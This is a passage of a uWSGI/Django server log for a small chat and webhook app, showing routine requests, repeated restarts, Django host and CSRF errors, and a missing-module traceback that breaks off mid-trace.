[pid: 24532|app: 0|req: 106/107] 211.49.146.107 () {46 vars in 986 bytes} [Wed Jun 10 05:10:26 2020] GET / => generated 1360 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 107/108] 1.255.2.199 () {46 vars in 988 bytes} [Wed Jun 10 05:10:34 2020] GET / => generated 1360 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 108/109] 203.237.164.115 () {40 vars in 783 bytes} [Wed Jun 10 05:10:41 2020] GET / => generated 1360 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 109/110] 1.255.2.103 () {46 vars in 986 bytes} [Wed Jun 10 05:10:56 2020] GET /chat => generated 0 bytes in 0 msecs (HTTP/1.1 301) 4 headers in 144 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 110/111] 58.123.220.139 () {46 vars in 991 bytes} [Wed Jun 10 05:10:56 2020] GET /chat/ => generated 1411 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 111/112] 1.255.22.70 () {46 vars in 988 bytes} [Wed Jun 10 05:16:11 2020] GET / => generated 1361 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 112/113] 223.62.226.73 () {46 vars in 990 bytes} [Wed Jun 10 05:17:04 2020] GET / => generated 1369 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 113/114] 1.255.2.136 () {46 vars in 986 bytes} [Wed Jun 10 05:17:07 2020] GET /chat => generated 0 bytes in 0 msecs (HTTP/1.1 301) 4 headers in 144 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 114/115] 211.49.146.42 () {46 vars in 990 bytes} [Wed Jun 10 05:17:07 2020] GET /chat/ => generated 1411 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
Not Found: /index
[pid: 24532|app: 0|req: 115/116] 1.255.22.6 () {46 vars in 987 bytes} [Wed Jun 10 05:17:18 2020] GET /index => generated 2226 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
Not Found: /index.html
[pid: 24532|app: 0|req: 116/117] 1.255.22.72 () {46 vars in 1018 bytes} [Wed Jun 10 05:17:41 2020] GET /index.html => generated 2241 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 117/118] 223.62.226.132 () {46 vars in 991 bytes} [Wed Jun 10 05:18:05 2020] GET / => generated 1365 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 118/119] 1.255.2.168 () {46 vars in 978 bytes} [Wed Jun 10 05:18:08 2020] GET / => generated 1365 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 119/120] 223.62.226.138 () {46 vars in 989 bytes} [Wed Jun 10 05:18:14 2020] GET /chat => generated 0 bytes in 0 msecs (HTTP/1.1 301) 4 headers in 144 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 120/121] 1.255.33.74 () {46 vars in 988 bytes} [Wed Jun 10 05:18:14 2020] GET /chat/ => generated 1411 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 121/122] 1.255.33.74 () {46 vars in 988 bytes} [Wed Jun 10 05:19:05 2020] GET / => generated 1365 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 122/123] 1.255.22.68 () {46 vars in 986 bytes} [Wed Jun 10 05:19:08 2020] GET /chat => generated 0 bytes in 0 msecs (HTTP/1.1 301) 4 headers in 144 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 123/124] 1.255.2.4 () {46 vars in 986 bytes} [Wed Jun 10 05:19:09 2020] GET /chat/ => generated 1472 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
Not Found: /chat/chat
[pid: 24532|app: 0|req: 124/125] 223.62.232.5 () {46 vars in 1002 bytes} [Wed Jun 10 05:24:23 2020] GET /chat/chat => generated 2238 bytes in 4 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
Not Found: /chat/chat
[pid: 24532|app: 0|req: 125/126] 223.62.226.135 () {46 vars in 1004 bytes} [Wed Jun 10 05:24:42 2020] GET /chat/chat => generated 2238 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 126/127] 1.255.2.5 () {46 vars in 991 bytes} [Wed Jun 10 05:24:50 2020] GET /chat/ => generated 1557 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 127/128] 223.62.232.72 () {46 vars in 990 bytes} [Wed Jun 10 05:25:18 2020] GET / => generated 1365 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 128/129] 1.255.2.7 () {46 vars in 984 bytes} [Wed Jun 10 05:25:20 2020] GET /chat => generated 0 bytes in 0 msecs (HTTP/1.1 301) 4 headers in 144 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 129/130] 1.255.2.5 () {46 vars in 986 bytes} [Wed Jun 10 05:25:21 2020] GET /chat/ => generated 1444 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 130/131] 223.62.226.75 () {46 vars in 995 bytes} [Wed Jun 10 05:25:23 2020] GET /chat/ => generated 1444 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 131/132] 1.255.2.228 () {46 vars in 993 bytes} [Wed Jun 10 05:25:26 2020] GET /chat/ => generated 1444 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 132/133] 1.255.22.197 () {46 vars in 994 bytes} [Wed Jun 10 05:25:42 2020] GET /chat/ => generated 1447 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 133/134] 1.255.2.202 () {46 vars in 983 bytes} [Wed Jun 10 05:25:45 2020] GET / => generated 1365 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 134/135] 1.225.35.100 () {46 vars in 987 bytes} [Wed Jun 10 05:25:47 2020] GET /chat => generated 0 bytes in 0 msecs (HTTP/1.1 301) 4 headers in 144 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 135/136] 1.255.2.198 () {46 vars in 988 bytes} [Wed Jun 10 05:25:47 2020] GET /chat/ => generated 1447 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 136/137] 211.49.146.69 () {46 vars in 985 bytes} [Wed Jun 10 05:25:49 2020] GET / => generated 1365 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 137/138] 223.62.226.69 () {46 vars in 988 bytes} [Wed Jun 10 05:25:52 2020] GET /chat => generated 0 bytes in 0 msecs (HTTP/1.1 301) 4 headers in 144 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 138/139] 223.62.225.75 () {46 vars in 990 bytes} [Wed Jun 10 05:25:52 2020] GET /chat/ => generated 1447 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 139/140] 58.229.92.74 () {46 vars in 989 bytes} [Wed Jun 10 05:26:45 2020] GET / => generated 1365 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 140/141] 1.255.2.201 () {46 vars in 986 bytes} [Wed Jun 10 05:26:47 2020] GET /chat => generated 0 bytes in 0 msecs (HTTP/1.1 301) 4 headers in 144 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 141/142] 223.62.226.72 () {46 vars in 990 bytes} [Wed Jun 10 05:26:47 2020] GET /chat/ => generated 1480 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
Not Found: /hudson
[pid: 24532|app: 0|req: 142/143] 162.243.137.140 () {34 vars in 407 bytes} [Wed Jun 10 05:57:49 2020] GET /hudson => generated 2188 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 143/144] 128.14.134.170 () {34 vars in 488 bytes} [Wed Jun 10 06:49:19 2020] GET / => generated 1365 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 144/145] 192.35.168.200 () {34 vars in 394 bytes} [Wed Jun 10 07:25:21 2020] GET / => generated 1365 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
Gracefully killing worker 1 (pid: 24532)...
*** Starting uWSGI 2.0.18 (64bit) on [Wed Jul  8 11:22:32 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1019-aws #21~18.04.1-Ubuntu SMP Mon May 11 12:33:03 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254605
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Apr 18 2020, 01:56:04)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x55e706617cf0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x55e706617cf0 pid: 10537 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 10537, cores: 1)
[pid: 10537|app: 0|req: 1/1] 121.171.33.70 () {42 vars in 812 bytes} [Wed Jul  8 11:22:35 2020] GET / => generated 1365 bytes in 31 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
Not Found: /favicon.ico
[pid: 10537|app: 0|req: 2/2] 121.171.33.70 () {44 vars in 814 bytes} [Wed Jul  8 11:22:36 2020] GET /favicon.ico => generated 2244 bytes in 7 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
[pid: 10537|app: 0|req: 3/3] 121.171.33.70 () {42 vars in 867 bytes} [Wed Jul  8 11:22:38 2020] GET /chat => generated 0 bytes in 0 msecs (HTTP/1.1 301) 4 headers in 144 bytes (1 switches on core 0)
[pid: 10537|app: 0|req: 4/4] 121.171.33.70 () {42 vars in 869 bytes} [Wed Jul  8 11:22:38 2020] GET /chat/ => generated 1480 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 10537|app: 0|req: 5/5] 121.171.33.70 () {42 vars in 864 bytes} [Wed Jul  8 11:22:48 2020] GET / => generated 1365 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
Gracefully killing worker 1 (pid: 10537)...
*** Starting uWSGI 2.0.18 (64bit) on [Mon Aug 24 04:30:44 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1032-aws #34~18.04.2-Ubuntu SMP Fri Jul 24 10:06:28 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x56344edfbcf0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x56344edfbcf0 pid: 9162 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 9162, cores: 1)
Invalid HTTP_HOST header: 'baristalk.net'. You may need to add 'baristalk.net' to ALLOWED_HOSTS.
Bad Request: /
[pid: 9162|app: 0|req: 1/1] 223.194.169.151 () {52 vars in 923 bytes} [Mon Aug 24 04:30:51 2020] GET / => generated 57584 bytes in 51 msecs (HTTP/1.1 400) 2 headers in 86 bytes (1 switches on core 0)
Invalid HTTP_HOST header: 'baristalk.net'. You may need to add 'baristalk.net' to ALLOWED_HOSTS.
Bad Request: /
[pid: 9162|app: 0|req: 2/2] 223.194.169.151 () {52 vars in 904 bytes} [Mon Aug 24 04:31:42 2020] GET / => generated 57565 bytes in 41 msecs (HTTP/1.1 400) 2 headers in 86 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Mon Aug 24 04:33:21 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1032-aws #34~18.04.2-Ubuntu SMP Fri Jul 24 10:06:28 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x565491713cf0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x565491713cf0 pid: 9173 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 9173, cores: 1)
[pid: 9173|app: 0|req: 1/1] 223.194.169.151 () {52 vars in 904 bytes} [Mon Aug 24 04:33:24 2020] GET / => generated 1365 bytes in 16 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 9173|app: 0|req: 2/2] 223.194.169.151 () {52 vars in 928 bytes} [Mon Aug 24 04:33:26 2020] GET /chat/ => generated 1476 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
Forbidden (Referer checking failed - no Referer.): /webhook/
[pid: 9173|app: 0|req: 3/3] 66.249.83.43 () {42 vars in 540 bytes} [Mon Aug 24 04:33:31 2020] POST /webhook/ => generated 3366 bytes in 3 msecs (HTTP/1.1 403) 4 headers in 129 bytes (1 switches on core 0)
Forbidden (Referer checking failed - no Referer.): /webhook/
[pid: 9173|app: 0|req: 4/4] 66.249.83.43 () {42 vars in 540 bytes} [Mon Aug 24 04:34:16 2020] POST /webhook/ => generated 3366 bytes in 2 msecs (HTTP/1.1 403) 4 headers in 129 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Mon Aug 24 04:37:29 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1032-aws #34~18.04.2-Ubuntu SMP Fri Jul 24 10:06:28 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x55d4869f0cf0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x55d4869f0cf0 pid: 9190 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 9190, cores: 1)
Forbidden (Referer checking failed - no Referer.): /webhook/
[pid: 9190|app: 0|req: 1/1] 66.249.83.45 () {42 vars in 540 bytes} [Mon Aug 24 04:37:41 2020] POST /webhook/ => generated 3366 bytes in 14 msecs (HTTP/1.1 403) 4 headers in 129 bytes (1 switches on core 0)
[pid: 9190|app: 0|req: 2/2] 223.194.169.151 () {54 vars in 959 bytes} [Mon Aug 24 04:37:46 2020] GET /chat/ => generated 1476 bytes in 2 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
Forbidden (Referer checking failed - no Referer.): /webhook/
[pid: 9190|app: 0|req: 3/3] 66.102.6.203 () {42 vars in 540 bytes} [Mon Aug 24 04:37:51 2020] POST /webhook/ => generated 3366 bytes in 2 msecs (HTTP/1.1 403) 4 headers in 129 bytes (1 switches on core 0)
[pid: 9190|app: 0|req: 4/4] 223.194.169.151 () {50 vars in 873 bytes} [Mon Aug 24 05:43:26 2020] GET / => generated 1365 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
Not Found: /favicon.ico
[pid: 9190|app: 0|req: 5/5] 223.194.169.151 () {48 vars in 791 bytes} [Mon Aug 24 05:43:27 2020] GET /favicon.ico => generated 2328 bytes in 5 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
[pid: 9190|app: 0|req: 6/6] 223.194.169.151 () {52 vars in 926 bytes} [Mon Aug 24 05:43:48 2020] GET /chat => generated 0 bytes in 0 msecs (HTTP/1.1 301) 4 headers in 144 bytes (1 switches on core 0)
[pid: 9190|app: 0|req: 7/7] 223.194.169.151 () {52 vars in 928 bytes} [Mon Aug 24 05:43:48 2020] GET /chat/ => generated 1476 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
Forbidden (Referer checking failed - no Referer.): /webhook/
[pid: 9190|app: 0|req: 8/8] 66.249.83.43 () {42 vars in 540 bytes} [Mon Aug 24 05:43:54 2020] POST /webhook/ => generated 3366 bytes in 2 msecs (HTTP/1.1 403) 4 headers in 129 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Mon Aug 24 05:45:53 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1032-aws #34~18.04.2-Ubuntu SMP Fri Jul 24 10:06:28 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x5648d7deacf0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x5648d7deacf0 pid: 9379 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 9379, cores: 1)
[pid: 9379|app: 0|req: 1/1] 66.102.6.201 () {42 vars in 540 bytes} [Mon Aug 24 05:45:59 2020] POST /webhook/ => generated 85 bytes in 5 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Mon Aug 24 07:59:28 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1032-aws #34~18.04.2-Ubuntu SMP Fri Jul 24 10:06:28 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x560fd0a6dd00
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x560fd0a6dd00 pid: 11031 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 11031, cores: 1)
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 7, in <module>
    from nlp import nlp
ModuleNotFoundError: No module named 'nlp'
[pid: 11031|app: 0|req: 1/1] 66.102.6.203 () {42 vars in 540 bytes} [Mon Aug 24 07:59:47 2020] POST /webhook/ => generated 114014 bytes in 78 msecs (HTTP/1.1 500) 5 headers in 157 bytes (1 switches on core 0)
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 7, in <module>
    from nlp import naverNlp
ModuleNotFoundError: No module named 'nlp'
[pid: 11031|app: 0|req: 2/2] 66.102.6.205 () {42 vars in 540 bytes} [Mon Aug 24 08:06:02 2020] POST /webhook/ => generated 114024 bytes in 70 msecs (HTTP/1.1 500) 5 headers in 157 bytes (1 switches on core 0)
Internal Server Error: /owa/auth/logon.aspx
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/deprecation.py", line 93, in __call__
    response = self.process_request(request)
  File "/usr/local/lib/python3.6/dist-packages/django/middleware/common.py", line 53, in process_request
    if self.should_redirect_with_slash(request):
  File "/usr/local/lib/python3.6/dist-packages/django/middleware/common.py", line 71, in should_redirect_with_slash
    not is_valid_path(request.path_info, urlconf) and
  File "/usr/local/lib/python3.6/dist-packages/django/urls/base.py", line 154, in is_valid_path
    resolve(path, urlconf)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/base.py", line 25, in resolve
    return get_resolver(urlconf).resolve(path)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
